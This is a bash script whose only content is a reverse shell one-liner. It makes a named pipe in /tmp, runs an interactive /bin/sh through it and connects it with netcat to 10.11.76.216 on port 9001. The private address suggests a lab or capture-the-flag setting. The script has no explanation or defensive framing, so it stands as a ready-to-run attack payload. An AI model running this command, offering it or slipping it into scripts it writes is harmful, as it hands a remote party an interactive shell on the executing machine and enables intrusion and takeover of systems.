#!/bin/bash

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.76.216 9001 >/tmp/f
